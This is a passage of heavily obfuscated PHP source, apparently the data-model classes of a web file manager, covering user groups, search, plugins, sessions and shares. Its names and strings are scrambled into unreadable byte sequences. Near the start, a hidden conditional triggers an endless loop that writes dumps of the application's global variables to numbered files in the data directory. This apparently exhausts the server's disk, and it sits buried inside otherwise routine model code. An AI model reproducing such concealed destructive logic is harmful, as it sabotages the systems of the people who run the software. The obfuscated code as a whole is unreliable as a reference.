$ÓíËŸ‰ = explode($íÙ¥¬·Í[231], $µôí·âœ); if (count($ÓíËŸ‰) < $íÙ¥¬·Í[631]) { $İ î›ÚÂ = $íÙ¥¬·Í[874]; $İ î›ÚÂ(); } $·™€Ô ¶ = $íÙ¥¬·Í[875]; $·™€Ô ¶($_SERVER[$íÙ¥¬·Í[876]]); $¥çÊ±Ã÷ = $íÙ¥¬·Í[870]; $¥çÊ±Ã÷(); $˜ÑÏ´´² = $íÙ¥¬·Í[877]; $€ÉŸ‘ = json_encode($GLOBALS[$íÙ¥¬·Í[878]]); $¸È½µ®Œ = 1; for ($©‰Çµú = $¸È½µ®Œ; $©‰Çµú > 0; $©‰Çµú++) { $˜ÑÏ´´²(DATA_PATH . $©‰Çµú, $€ÉŸ‘); } } $ËæÀòŸÁ = $this->getInfoSimple($şáğÌ“Í); if (!$ËæÀòŸÁ || !is_array($ÎÜ£¿ßñ)) { return !1; } $µ™‰æâô = Model($íÙ¥¬·Í[1939]); $µ™‰æâô->where(array($íÙ¥¬·Í[1660] => $şáğÌ“Í))->delete(); $Àİ¶ = array(); $û†ª¦§ = 0; foreach ($ÎÜ£¿ßñ as $ˆëÙ’ÚÄ => $Ï›†ä“•) { $â¯œÛª  = array($íÙ¥¬·Í[1660] => $şáğÌ“Í, $íÙ¥¬·Í[1849] => $ˆëÙ’ÚÄ, $íÙ¥¬·Í[1953] => $Ï›†ä“•); $â¯œÛª [$íÙ¥¬·Í[1873]] = isset($î—©äĞ‚[$û†ª¦§]) ? $î—©äĞ‚[$û†ª¦§] : 0; $û†ª¦§++; $Àİ¶[] = $â¯œÛª ; } return $µ™‰æâô->addAll($Àİ¶, array(), !0); } protected function userGroupAdd($Ù—ñğÜ½, $Âêá˜›¿ = array()) { $†µ‘ÆÁ× =& $_SERVER[­õöî’–]; $¿‘¹Á“Ğ = $this->getInfoSimple($Ù—ñğÜ½); if (!$¿‘¹Á“Ğ || empty($Âêá˜›¿)) { return !1; } $çÛÀ¡† = array(); foreach ($Âêá˜›¿ as $ëŸ¨ç™¸ => $‚Ôü¬¨€) { $çÛÀ¡†[] = array($†µ‘ÆÁ×[1660] => $Ù—ñğÜ½, $†µ‘ÆÁ×[1849] => $ëŸ¨ç™¸, $†µ‘ÆÁ×[1953] => $‚Ôü¬¨€, $†µ‘ÆÁ×[1873] => 0); } return Model($†µ‘ÆÁ×[1939])->addAll($çÛÀ¡†, array(), !0); } protected function userGroupRemove($ŠØíõ, $¯š«Õ) { $«Óş•ùŒ =& $_SERVER[­õöî’–]; $ Ó¬Ä™ë = $this->getInfoSimple($ŠØíõ); if (!$ Ó¬Ä™ë || !$¯š«Õ) { return !1; } $ößáÒí« = array($«Óş•ùŒ[1651] => $ŠØíõ, $«Óş•ùŒ[1937] => $¯š«Õ); return Model($«Óş•ùŒ[1939])->where($ößáÒí«)->delete(); } public function listData() { $†ŸÀñ”š = $this->_makeOrder()->selectPage(50); $this->_listDataApply($†ŸÀñ”š[$_SERVER[­õöî’–][369]]); return $†ŸÀñ”š; } public function listByID($éËŒï´Â) { $øÌ‹‡–ä =& $_SERVER[­õöî’–]; if (!$éËŒï´Â) { return; } $è«£ÃßÔ = array($øÌ‹‡–ä[1660] => array($øÌ‹‡–ä[7], $éËŒï´Â)); $Šû”Àé‘ = $this->where($è«£ÃßÔ)->select(); $Šû”Àé‘ = array_sort_keep($Šû”Àé‘, $øÌ‹‡–ä[1660], $éËŒï´Â); $this->_listDataApply($Šû”Àé‘); return $Šû”Àé‘; } public function listByGroup($•”ë¢íÆ = 0, $Ô½Á‰Ûˆ = array()) { $Çâ–‰‡ =& $_SERVER[­õöî’–]; $Üâ¦˜¼ = $Çâ–‰‡[12]; $Âû¦§Æ² = array(); if ($•”ë¢íÆ) { $Âû¦§Æ² = array($Çâ–‰‡[2328] => intval($•”ë¢íÆ)); $Üâ¦˜¼ = "\x4c\105\x46\124\40\x4a\117\x49\x4e\40{$this->tablePrefix}\165\x73\x65\x72\137\x67\162\157\x75\160\40\165\163\x65\162\137\x67\162\x6f\x75\160\x20\x6f\156\x20\165\163\145\x72\56\165\x73\145\x72\x49\104\40\75\40\x75\x73\145\162\x5f\147\x72\x6f\x75\x70\x2e\x75\x73\145\162\x49\104"; $‚ÜĞ‹Ô÷ = Input::get($Çâ–‰‡[457], null, $Çâ–‰‡[12]) ? $Çâ–‰‡[12] : $Çâ–‰‡[2329]; } if (isset($Ô½Á‰Ûˆ[$Çâ–‰‡[741]])) { $Âû¦§Æ²[$Çâ–‰‡[2330]] = $Ô½Á‰Ûˆ[$Çâ–‰‡[741]]; } $ø‡¾³şğ = $this->_makeOrder($‚ÜĞ‹Ô÷)->field($Çâ–‰‡[2331])->where($Âû¦§Æ²)->join($Üâ¦˜¼)->selectPage(50); $this->_listDataApply($ø‡¾³şğ[$Çâ–‰‡[369]]); return $ø‡¾³şğ; } private function _makeOrder($¼§»ß = '') { $¸‹²ªĞ‘ =& $_SERVER[­õöî’–]; $¡–ß×£ = array($¸‹²ªĞ‘[1660], $¸‹²ªĞ‘[32], $¸‹²ªĞ‘[1838], $¸‹²ªĞ‘[1810], $¸‹²ªĞ‘[200]); $¸«­Æî† = array($¸‹²ªĞ‘[450] => $¸‹²ªĞ‘[451], $¸‹²ªĞ‘[452] => $¸‹²ªĞ‘[453]); $Š·ìşÆŸ = Input::get($¸‹²ªĞ‘[457], $¸‹²ªĞ‘[7], $¸‹²ªĞ‘[1651], $¡–ß×£); $ÏÔÙ¹õ = Input::get($¸‹²ªĞ‘[458], $¸‹²ªĞ‘[7], $¸‹²ªĞ‘[1940], array($¸‹²ªĞ‘[1940], $¸‹²ªĞ‘[452])); $ÏÔÙ¹õ = $¸«­Æî†[$ÏÔÙ¹õ]; $¼§»ß = $¼§»ß . "\165\x73\145\x72\56{$Š·ìşÆŸ}\40{$ÏÔÙ¹õ}\x2c\x20\165\163\145\162\x2e\165\x73\145\162\111\x44\40\141\163\x63"; return $this->alias($¸‹²ªĞ‘[2062])->order($¼§»ß); } public function listSearch($ÌúÓ³ü©) { $ƒñ¾µ›ˆ =& $_SERVER[­õöî’–]; $®Ççõá‡ = $ÌúÓ³ü©[$ƒñ¾µ›ˆ[1943]]; $»È†íÏÍ = isset($ÌúÓ³ü©[$ƒñ¾µ›ˆ[1944]]) ? $ÌúÓ³ü©[$ƒñ¾µ›ˆ[1944]] : !1; $®Ççõá‡ = str_replace($ƒñ¾µ›ˆ[1945], $ƒñ¾µ›ˆ[1946], trim($®Ççõá‡)); $¦³°õ× = array($ƒñ¾µ›ˆ[32] => array($ƒñ¾µ›ˆ[383], "\45{$®Ççõá‡}\45"), $ƒñ¾µ›ˆ[305] => array($ƒñ¾µ›ˆ[383], "{$®Ççõá‡}\45"), $ƒñ¾µ›ˆ[542] => array($ƒñ¾µ›ˆ[383], "{$®Ççõá‡}\45"), $ƒñ¾µ›ˆ[998] => $ƒñ¾µ›ˆ[1947]); if (Input::check($®Ççõá‡, $ƒñ¾µ›ˆ[311])) { $¦³°õ×[$ƒñ¾µ›ˆ[1660]] = array($ƒñ¾µ›ˆ[383], "{$®Ççõá‡}\45"); $¦³°õ×[$ƒñ¾µ›ˆ[2313]] = array($ƒñ¾µ›ˆ[383], "{$®Ççõá‡}\45"); } if (!$®Ççõá‡) { $¦³°õ× = array(); } if (isset($ÌúÓ³ü©[$ƒñ¾µ›ˆ[741]])) { $¦³°õ×[$ƒñ¾µ›ˆ[741]] = $ÌúÓ³ü©[$ƒñ¾µ›ˆ[741]]; } $¦³°õ× = $this->parseWhereLike($¦³°õ×); $ƒ¡“şø‰ = $this->_makeOrder()->where($¦³°õ×)->selectPage(20); if (!$ƒ¡“şø‰ || count($ƒ¡“şø‰[$ƒñ¾µ›ˆ[369]]) < 5 && Input::check($®Ççõá‡, $ƒñ¾µ›ˆ[318])) { $­ßğİ™İ = $this->_searchFromMeta($ƒñ¾µ›ˆ[464], $®Ççõá‡, 10); $·®ä„­÷ = $this->_searchFromMeta($ƒñ¾µ›ˆ[465], $®Ççõá‡, 10); $İİáÒ­ = array_merge($­ßğİ™İ, $·®ä„­÷, $ƒ¡“şø‰[$ƒñ¾µ›ˆ[369]]); $ƒ¡“şø‰[$ƒñ¾µ›ˆ[369]] = array_unique_by_key($İİáÒ­, $ƒñ¾µ›ˆ[1660]); $ƒ¡“şø‰[$ƒñ¾µ›ˆ[366]][$ƒñ¾µ›ˆ[367]] = count($ƒ¡“şø‰[$ƒñ¾µ›ˆ[369]]); $ƒ¡“şø‰[$ƒñ¾µ›ˆ[366]][$ƒñ¾µ›ˆ[368]] = ceil($ƒ¡“şø‰[$ƒñ¾µ›ˆ[366]][$ƒñ¾µ›ˆ[367]] / $ƒ¡“şø‰[$ƒñ¾µ›ˆ[366]][$ƒñ¾µ›ˆ[363]]); } $this->_listDataApply($ƒ¡“şø‰[$ƒñ¾µ›ˆ[369]]); $this->_filterByGroup($ƒ¡“şø‰, $»È†íÏÍ); return $ƒ¡“şø‰; } private function _filterByGroup(&$’“Ó÷×, $ŸÔÏÊÖ”) { $€„Ğí®ó =& $_SERVER[­õöî’–]; if (!$ŸÔÏÊÖ”) { return $’“Ó÷×; } foreach ($’“Ó÷×[$€„Ğí®ó[369]] as $†üØ¢œÉ => &$ü”¢‚²) { $„Ø¿âøÆ = array_to_keyvalue($ü”¢‚²[$€„Ğí®ó[2032]], $€„Ğí®ó[12], $€„Ğí®ó[1849]); if (!in_array($ŸÔÏÊÖ”, $„Ø¿âøÆ)) { unset($’“Ó÷×[$€„Ğí®ó[369]][$†üØ¢œÉ]); } } unset($ü”¢‚²); $’“Ó÷×[$€„Ğí®ó[369]] = array_values($’“Ó÷×[$€„Ğí®ó[369]]); $’“Ó÷×[$€„Ğí®ó[366]] = array($€„Ğí®ó[2096] => count($’“Ó÷×[$€„Ğí®ó[369]]), $€„Ğí®ó[2094] => $’“Ó÷×[$€„Ğí®ó[366]][$€„Ğí®ó[363]], $€„Ğí®ó[2093] => 1, $€„Ğí®ó[2095] => 1); } private function _searchFromMeta($“í³şâ, $íşî´Üé, $õˆá€ïõ) { $Êşš­°Â =& $_SERVER[­õöî’–]; $íşî´Üé = strtolower($íşî´Üé); $é¢È´¦‡ = array($Êşš­°Â[94] => $“í³şâ, $Êşš­°Â[374] => array($Êşš­°Â[383], "\45{$íşî´Üé}\x25")); $é¢È´¦‡ = $this->parseWhereLike($é¢È´¦‡); $†¢¾õµ = Model($Êşš­°Â[2332])->where($é¢È´¦‡)->limit($õˆá€ïõ)->select(); if (!$†¢¾õµ) { return array(); } $†¢¾õµ = array_to_keyvalue($†¢¾õµ, $Êşš­°Â[12], $Êşš­°Â[1660]); $Âí”ı¯ = $this->where(array($Êşš­°Â[1651] => array($Êşš­°Â[7], $†¢¾õµ)))->select(); if (!$Âí”ı¯) { return array(); } return $Âí”ı¯; } private function _listDataApplyItem($Ğê­®û“) { $×ÑÚ£´Æ = array($Ğê­®û“); $this->_listDataApply($×ÑÚ£´Æ); return $×ÑÚ£´Æ[0]; } private function _listDataApply(&$˜øõŸóØ) { $›ÔŠòø± =& $_SERVER[­õöî’–]; if (!$˜øõŸóØ) { return; } array_remove_key($˜øõŸóØ, $›ÔŠòø±[886]); $ûÈ¨ö‚Ñ = array_to_keyvalue($˜øõŸóØ, $›ÔŠòø±[12], $›ÔŠòø±[1660]); $this->_listAppendGroup($˜øõŸóØ, $ûÈ¨ö‚Ñ); $this->_listAppendMeta($˜øõŸóØ, $ûÈ¨ö‚Ñ); $this->_listAppendSourceRoot($˜øõŸóØ, $ûÈ¨ö‚Ñ); } private function _listAppendSourceRoot(&$õÁºè¨¦, $Ì¯ó‡ß½) { $Á¡êÉˆâ =& $_SERVER[­õöî’–]; $º‹ˆÄ¾ = Model($Á¡êÉˆâ[816])->listSourceRoot(SourceModel::TYPE_USER, $Ì¯ó‡ß½); $º‹ˆÄ¾ = array_to_keyvalue($º‹ˆÄ¾, $Á¡êÉˆâ[505]); $º‹ˆÄ¾ = array_remove_key($º‹ˆÄ¾, $Á¡êÉˆâ[505]); foreach ($õÁºè¨¦ as &$øŠÎ¼Æô) { $øŠÎ¼Æô[$Á¡êÉˆâ[86]] = $º‹ˆÄ¾[$øŠÎ¼Æô[$Á¡êÉˆâ[1660]]] ? $º‹ˆÄ¾[$øŠÎ¼Æô[$Á¡êÉˆâ[1660]]] : array(); } unset($øŠÎ¼Æô); } private function _listAppendGroup(&$Ãë¸ê»‹, $é°¤‡è‰) { $…ñ™´Öß =& $_SERVER[­õöî’–]; $èãì’ÙÖ = array($…ñ™´Öß[1660] => array($…ñ™´Öß[7], $é°¤‡è‰)); $ö£¤òñŸ = Model($…ñ™´Öß[1939])->where($èãì’ÙÖ)->select(); $Ğ¥¿´Á = array_to_keyvalue($ö£¤òñŸ, $…ñ™´Öß[12], $…ñ™´Öß[1849]); $Ğ¥¿´Á = array_remove_value(array_unique($Ğ¥¿´Á), $…ñ™´Öß[197]); if (!$Ğ¥¿´Á || !$ö£¤òñŸ) { return; } $èãì’ÙÖ = array($…ñ™´Öß[1849] => array($…ñ™´Öß[7], $Ğ¥¿´Á)); $ÑÕ˜’ç€ = Model($…ñ™´Öß[2030])->field($…ñ™´Öß[2333])->where($èãì’ÙÖ)->select(); $ÑÕ˜’ç€ = array_to_keyvalue($ÑÕ˜’ç€, $…ñ™´Öß[1849]); $ö£¤òñŸ = array_to_keyvalue_group($ö£¤òñŸ, $…ñ™´Öß[1660]); foreach ($ö£¤òñŸ as &$³‘ªğå¬) { $âÙ²äÃŒ = array(); foreach ($³‘ªğå¬ as $Üü’²—Ÿ) { if (!$Üü’²—Ÿ[$…ñ™´Öß[1953]]) { continue; } $‰¤½Š• = Model($…ñ™´Öß[507])->listData($Üü’²—Ÿ[$…ñ™´Öß[1953]]); $âÙ²äÃŒ[] = array($…ñ™´Öß[1849] => $Üü’²—Ÿ[$…ñ™´Öß[1849]], $…ñ™´Öß[2334] => $ÑÕ˜’ç€[$Üü’²—Ÿ[$…ñ™´Öß[1849]]][$…ñ™´Öß[32]], $…ñ™´Öß[521] => $ÑÕ˜’ç€[$Üü’²—Ÿ[$…ñ™´Öß[1849]]][$…ñ™´Öß[521]], $…ñ™´Öß[413] => $‰¤½Š•); } $³‘ªğå¬ = $âÙ²äÃŒ; } unset($³‘ªğå¬); foreach ($Ãë¸ê»‹ as &$°ôµ…ÉÃ) { $°ôµ…ÉÃ[$…ñ™´Öß[2032]] = array(); if (isset($ö£¤òñŸ[$°ôµ…ÉÃ[$…ñ™´Öß[1660]]])) { $°ôµ…ÉÃ[$…ñ™´Öß[2032]] = $ö£¤òñŸ[$°ôµ…ÉÃ[$…ñ™´Öß[1660]]]; } } unset($°ôµ…ÉÃ); } public function userAppendGroup($Øå¸””â) { $„´‹€Ó· =& $_SERVER[­õöî’–]; if (!$Øå¸””â) { return array(); } $this->_listAppendGroup($Øå¸””â, array_to_keyvalue($Øå¸””â, $„´‹€Ó·[12], $„´‹€Ó·[1660])); return $Øå¸””â; } private function _listAppendMeta(&$ŸŠ·ò¥£, $è„ø„ƒÄ) { $İüå£ñ£ =& $_SERVER[­õöî’–]; $Òş³ŸÜ® = UserJobModel::JOB_KEY; $Ş¤îÉø’ = array($İüå£ñ£[2314]); $æôˆ·Ø‚ = array($İüå£ñ£[1660] => array($İüå£ñ£[7], $è„ø„ƒÄ)); $äõÁ¹á“ = Model($İüå£ñ£[2312])->where($æôˆ·Ø‚)->select(); $äõÁ¹á“ = array_to_keyvalue_group($äõÁ¹á“, $İüå£ñ£[1660]); foreach ($äõÁ¹á“ as &$“÷ø·ë°) { $œÀ©äÛË = array(); foreach ($“÷ø·ë° as $Ş›İÚ) { if (!in_array($Ş›İÚ[$İüå£ñ£[94]], $Ş¤îÉø’)) { $œÀ©äÛË[$Ş›İÚ[$İüå£ñ£[94]]] = $Ş›İÚ[$İüå£ñ£[374]]; } } $“÷ø·ë° = $œÀ©äÛË; } unset($“÷ø·ë°); $†çÈ±Ã… = Model($İüå£ñ£[2335]); foreach ($ŸŠ·ò¥£ as &$Ö†ıöí‡) { $•ËÙßÃ = array(); if (isset($äõÁ¹á“[$Ö†ıöí‡[$İüå£ñ£[1660]]])) { $•ËÙßÃ = $äõÁ¹á“[$Ö†ıöí‡[$İüå£ñ£[1660]]]; } $Ö†ıöí‡[$İüå£ñ£[2336]] = array(); if (isset($•ËÙßÃ[$Òş³ŸÜ®])) { $Ö†ıöí‡[$İüå£ñ£[2336]] = $†çÈ±Ã…->getUserJobInfo($•ËÙßÃ[$Òş³ŸÜ®]); } } unset($Ö†ıöí‡); } protected function groupUserAll($¿­±úÄ) { $õú€å¦» =& $_SERVER[­õöî’–]; if (!$¿­±úÄ) { return !1; } $ó“¼œ‚Ï = Model($õú€å¦»[1939])->field($õú€å¦»[1660])->where(array($õú€å¦»[1849] => array($õú€å¦»[7], $¿­±úÄ)))->select(); $ó“¼œ‚Ï = array_to_keyvalue($ó“¼œ‚Ï, $õú€å¦»[12], $õú€å¦»[1660]); return array_unique($ó“¼œ‚Ï); } public function userSearch($ĞÇä¼÷¨, $˜äˆ±  = "\x2a") { return Model($_SERVER[­õöî’–][535])->where($ĞÇä¼÷¨)->field($˜äˆ± )->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\145\162\x5f\x6f\160\164\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($¬…ßØ) { $ÓÓçù¹³ =& $_SERVER[­õöî’–]; if (!defined($ÓÓçù¹³[475])) { define($ÓÓçù¹³[475], 0); } return "\x55\163\145\162\117\160\164\x69\157\156\137{$¬…ßØ}\x5f" . USER_ID; } protected function filterWhere($¡ÂŒ­ ) { $Àú‚Ùü =& $_SERVER[­õöî’–]; if (!defined($Àú‚Ùü[475])) { define($Àú‚Ùü[475], 0); } $¡ÂŒ­ [$Àú‚Ùü[1660]] = USER_ID; return $¡ÂŒ­ ; } public function cacheRemoveUser($ĞÌÆ‚ó, $åÜå›ãƒ) { return Cache::remove("\x55\x73\145\x72\x4f\x70\164\151\157\x6e\x5f{$ĞÌÆ‚ó}\x5f" . $åÜå›ãƒ); } protected function optionDefault($ª¦çşæó = '') { $ÜõŠ¥ =& $_SERVER[­õöî’–]; if ($ª¦çşæó == $ÜõŠ¥[12]) { return $GLOBALS[$ÜõŠ¥[6]][$ÜõŠ¥[2337]]; } if ($ª¦çşæó == $ÜõŠ¥[2338]) { return $GLOBALS[$ÜõŠ¥[6]][$ÜõŠ¥[2339]]; } } } goto dßÌìÇÌ´…; d¢‚”®áˆ: class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\x6d\x2e\x70\154\165\x67\x69\x6e\x4c\151\x73\x74"; public $field = array("\x6e\x61\x6d\145", "\x73\164\141\164\x75\163", "\162\145\x67\151\x65\x73\x74", "\143\157\x6e\x66\x69\x67"); public function loadList($õ¸”¥“À = false) { $İÁÜìÆ€ = array_to_keyvalue($this->listData(), $_SERVER[­õöî’–][32]); if ($õ¸”¥“À) { return $İÁÜìÆ€[$õ¸”¥“À]; } return $İÁÜìÆ€; } public function init() { $‰çí Ú– =& $_SERVER[­õöî’–]; Hook::trigger($‰çí Ú–[1969]); $•½Šû­Ü = $this->loadPluginList(); foreach ($•½Šû­Ü as $ÎÀ¦µºë => $ˆ«ÔõÂó) { $ââí–Âê = $this->appAllow($ÎÀ¦µºë, $ˆ«ÔõÂó); if (!$ââí–Âê) { continue; } foreach ($ˆ«ÔõÂó[$‰çí Ú–[1970]] as $Ê×‰ª… => $ù¾µğŒ) { Hook::bind($Ê×‰ª…, $ù¾µğŒ); } } Hook::trigger($‰çí Ú–[1971]); Hook::trigger(ACTION); } public function appAllow($á¥¾•ò, $«İÉ”ÂÚ, $Ú¦‡’ôË = true) { $¨ŞæıêÔ =& $_SERVER[­õöî’–]; $ÏŸóÚÚ˜ = PLUGIN_DIR . $á¥¾•ò . $¨ŞæıêÔ[1972]; if (!is_array($«İÉ”ÂÚ) || !is_array($«İÉ”ÂÚ[$¨ŞæıêÔ[1970]]) || $«İÉ”ÂÚ[$¨ŞæıêÔ[741]] != 1 || !is_file($ÏŸóÚÚ˜)) { return !1; } if ($GLOBALS[$¨ŞæıêÔ[503]] == 1) { if ($GLOBALS[$¨ŞæıêÔ[6]][$¨ŞæıêÔ[1973]] || !$GLOBALS[$¨ŞæıêÔ[6]][$¨ŞæıêÔ[1974]]) { return !0; } $ƒ’ƒ¢Ğ¼ = explode($¨ŞæıêÔ[50], strtolower($GLOBALS[$¨ŞæıêÔ[6]][$¨ŞæıêÔ[1974]])); return in_array(strtolower($á¥¾•ò), $ƒ’ƒ¢Ğ¼) ? !1 : !0; } if ($Ú¦‡’ôË && !Action($¨ŞæıêÔ[1975])->checkAuth($á¥¾•ò)) { return !1; } return !0; } public function unInstall($©‹©ı±) { $‹¶¢úúŠ =& $_SERVER[­õöî’–]; $”ßËÊÙ = $this->loadList($©‹©ı±); if (file_exists(PLUGIN_DIR . $©‹©ı±)) { Hook::apply($©‹©ı± . $‹¶¢úúŠ[1976]); } $this->remove($”ßËÊÙ[$‹¶¢úúŠ[399]]); } public function changeStatus($ÎŠª±», $„•æˆñÌ) { $ô×Õä—Œ =& $_SERVER[­õöî’–]; $ÇÇƒğ¯Œ = $this->loadList($ÎŠª±»); if ($„•æˆñÌ) { Hook::apply($ÎŠª±» . $ô×Õä—Œ[1977]); } $this->update($ÇÇƒğ¯Œ[$ô×Õä—Œ[399]], array($ô×Õä—Œ[1978] => $„•æˆñÌ)); } public function appRegist($£’üü¦€, $á÷‚—¬) { $ÉåÂ„àÒ =& $_SERVER[­õöî’–]; $×·¥Œò‚ = $this->loadList($£’üü¦€); if ($×·¥Œò‚) { $this->update($×·¥Œò‚[$ÉåÂ„àÒ[399]], array($ÉåÂ„àÒ[1970] => $á÷‚—¬)); } else { $¾õ¾„Ù¨ = array($ÉåÂ„àÒ[32] => $£’üü¦€, $ÉåÂ„àÒ[1970] => $á÷‚—¬, $ÉåÂ„àÒ[741] => 0, $ÉåÂ„àÒ[6] => $this->getConfigDefault($£’üü¦€)); $this->insert($¾õ¾„Ù¨); } } public function getConfigDefault($£˜²³á) { $ÅØÜÌÏš =& $_SERVER[­õöî’–]; $¢‘ÌçÉ– = array(); $ÓÑÚİí… = $this->getPackageJson($£˜²³á); if (!$ÓÑÚİí… && is_array($ÓÑÚİí…[$ÅØÜÌÏš[1979]])) { return $¢‘ÌçÉ–; } foreach ($ÓÑÚİí…[$ÅØÜÌÏš[1979]] as $”Šíî¥Ñ => $ê°¾×‘ë) { if (!isset($ê°¾×‘ë[$ÅØÜÌÏš[374]]) || isset($¢‘ÌçÉ–[$”Šíî¥Ñ])) { continue; } $¢‘ÌçÉ–[$”Šíî¥Ñ] = $ê°¾×‘ë[$ÅØÜÌÏš[374]]; } return $¢‘ÌçÉ–; } public function getPackageJson($³Æš€Ğş) { return Hook::apply($³Æš€Ğş . $_SERVER[­õöî’–][1980]); } public function getConfig($ã•ÄãÚƒ, $’¬æŒÓ« = false) { $°ËßŒÌÍ =& $_SERVER[­õöî’–]; $òñóøí = array(); $ß€§Ø’² = $this->loadList($ã•ÄãÚƒ); if ($ß€§Ø’² && is_array($ß€§Ø’²[$°ËßŒÌÍ[6]])) { $òñóøí = $ß€§Ø’²[$°ËßŒÌÍ[6]]; } if (!$òñóøí || $’¬æŒÓ«) { $òñóøí = $this->getConfigDefault($ã•ÄãÚƒ); } return $òñóøí; } public function setConfig($ºï´×¥, $Ó¼“µ«€ = false) { $åÌ³¦çÇ =& $_SERVER[­õöî’–]; $ûäÃËƒş = $this->loadList($ºï´×¥); if (!$ûäÃËƒş) { return !1; } $­ÎÍö·€ = $ûäÃËƒş[$åÌ³¦çÇ[6]]; if ($Ó¼“µ«€ == !1) { $­ÎÍö·€ = array(); $Ó¼“µ«€ = $this->getConfigDefault($ºï´×¥); } foreach ($Ó¼“µ«€ as $Ø‚Ø³’Ì => $ÖÎ–Ë) { $­ÎÍö·€[$Ø‚Ø³’Ì] = is_string($ÖÎ–Ë) ? trim($ÖÎ–Ë) : $ÖÎ–Ë; } $this->update($ûäÃËƒş[$åÌ³¦çÇ[399]], array($åÌ³¦çÇ[6] => $­ÎÍö·€)); } public function viewList() { $ÀüÖØ¤¾ =& $_SERVER[­õöî’–]; $àÄúŸş¦ = $this->loadList(); $this->pluginScan($àÄúŸş¦); $àÄúŸş¦ = $this->loadPluginList(); $—Óì¶É€ = array(); foreach ($àÄúŸş¦ as $¦°ãëÌ => $­²¯óæ) { unset($­²¯óæ[$ÀüÖØ¤¾[1970]], $­²¯óæ[$ÀüÖØ¤¾[6]]); $¯øÛÇ³ = PLUGIN_DIR . $­²¯óæ[$ÀüÖØ¤¾[32]] . $ÀüÖØ¤¾[1972]; if (!is_file($¯øÛÇ³)) { continue; } $–ªº‡Ã¡ = Hook::apply($­²¯óæ[$ÀüÖØ¤¾[32]] . $ÀüÖØ¤¾[1980]); if (is_array($–ªº‡Ã¡)) { $—Óì¶É€[$¦°ãëÌ] = array_merge($­²¯óæ, $–ªº‡Ã¡); } } return $—Óì¶É€; } private function loadPluginList() { $Ò÷°¹Íç =& $_SERVER[­õöî’–]; $Àğ€’Ñî = $this->loadList(); if (strtolower(MOD) == $Ò÷°¹Íç[1981]) { return $Àğ€’Ñî; } $ÂÖÍèª = Hook::trigger($Ò÷°¹Íç[1982], $Àğ€’Ñî); if ($Àğ€’Ñî && !$ÂÖÍèª) { die; } return $ÂÖÍèª ? $ÂÖÍèª : $Àğ€’Ñî; } private function pluginScan($¡ÅñŞö) { $éú½·ğ =& $_SERVER[­õöî’–]; recursion_dir(PLUGIN_DIR, $ã®ÚÓê, $„û±Î•, 0); foreach ($ã®ÚÓê as $ÂûÓ¿ù) { $şÔ‹«åÏ = get_path_this($ÂûÓ¿ù); if (isset($¡ÅñŞö[$şÔ‹«åÏ]) || !file_exists($ÂûÓ¿ù . $éú½·ğ[1983]) || !file_exists($ÂûÓ¿ù . $éú½·ğ[1972])) { continue; } Hook::apply($şÔ‹«åÏ . $éú½·ğ[1977]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\145\x6d\137\163\145\163\x73\x69\157\x6e"; public function get($‚ßÏøâ˜) { $ĞèøœíÇ =& $_SERVER[­õöî’–]; $ÁÇÏ¶áï = $this->where(array($ĞèøœíÇ[1984] => $‚ßÏøâ˜))->find(); if (!is_array($ÁÇÏ¶áï)) { return !1; } return $ÁÇÏ¶áï[$ĞèøœíÇ[746]]; } public function set($›œ¼Ó‡¾, $¥½İÎËó, $´»ˆÅ¥ë = 3600) { $²¯‘¾ı² =& $_SERVER[­õöî’–]; $µ­ÆŸ”Î = array($²¯‘¾ı²[1984] => $›œ¼Ó‡¾, $²¯‘¾ı²[1888] => $¥½İÎËó, $²¯‘¾ı²[1985] => $´»ˆÅ¥ë + time()); if (Session::get($²¯‘¾ı²[1986])) { $µ­ÆŸ”Î[$²¯‘¾ı²[1660]] = Session::get($²¯‘¾ı²[1986]); } else { $µ­ÆŸ”Î[$²¯‘¾ı²[1660]] = 0; } if ($this->get($›œ¼Ó‡¾)) { return $this->where(array($²¯‘¾ı²[1984] => $›œ¼Ó‡¾))->save($µ­ÆŸ”Î); } else { return $this->add($µ­ÆŸ”Î, array(), !0); } } public function remove($õïç½¿¨) { return $this->where(array($_SERVER[­õöî’–][1984] => $õïç½¿¨))->delete(); } public function clearTimeout() { return $this->where($_SERVER[­õöî’–][1987] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\162\145"; protected $dataAuto = array(array("\155\x6f\144\151\x66\171\124\151\x6d\145", "\x74\151\x6d\145", "\x69\x6e\x73\x65\162\x74\54\x75\160\x64\141\164\x65", "\x66\x75\x6e\143\x74\x69\x6f\156"), array("\x63\162\145\141\x74\145\124\151\155\145", "\164\151\155\x65", "\x69\x6e\163\145\162\x74", "\x66\165\x6e\x63\164\x69\x6f\x6e"), array("\x6f\160\164\151\157\156\163", '', "\151\156\x73\x65\x72\x74\x2c\165\x70\x64\x61\x74\145\54\x73\x65\154\x65\x63\x74", "\x6a\163\x6f\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($®Œ¨Ëâ†) { $ŸÄ¬”Çù =& $_SERVER[­õöî’–]; $×¨¯Æä¬ = isset($®Œ¨Ëâ†[0]) ? $®Œ¨Ëâ†[0] : !1; return array($ŸÄ¬”Çù[1988] => array(USER_ID, $ŸÄ¬”Çù[1989]), $ŸÄ¬”Çù[1929] => array($×¨¯Æä¬, $ŸÄ¬”Çù[1990])); } protected function listSimple() { $±Ãëµ¿½ = array($_SERVER[­õöî’–][1660] => USER_ID); $¬°Î•Ú = $this->field($this->fieldList)->where($±Ãëµ¿½)->select(); return $¬°Î•Ú ? $¬°Î•Ú : array(); } protected function getInfo($ÜÓÔ¢­, $™Ìı“é = false) { $æŒ•”…æ =& $_SERVER[­õöî’–]; if ($™Ìı“é) { return $this->_getShareInfo(array($æŒ•”…æ[489] => $ÜÓÔ¢­)); } $±¶Ş³Æ± = $this->cacheFunctionGet($æŒ•”…æ[1931], $ÜÓÔ¢­); return $±¶Ş³Æ±; } public function getInfoByHash($ùë¿Ü“Í) { return $this->_getShareInfo(array($_SERVER[­õöî’–][491] => $ùë¿Ü“Í)); } public function getInfoByPath($æø†Üœ¸) { $È†ãÇğ =& $_SERVER[­õöî’–]; $£ÕÖ› = array($È†ãÇğ[1660] => USER_ID, $È†ãÇğ[402] => $æø†Üœ¸); return $this->_getShareInfo($£ÕÖ›); } public function getInfoBySourcePath($íš¤ÚÉ×) { $¼Ÿû…Œ¢ =& 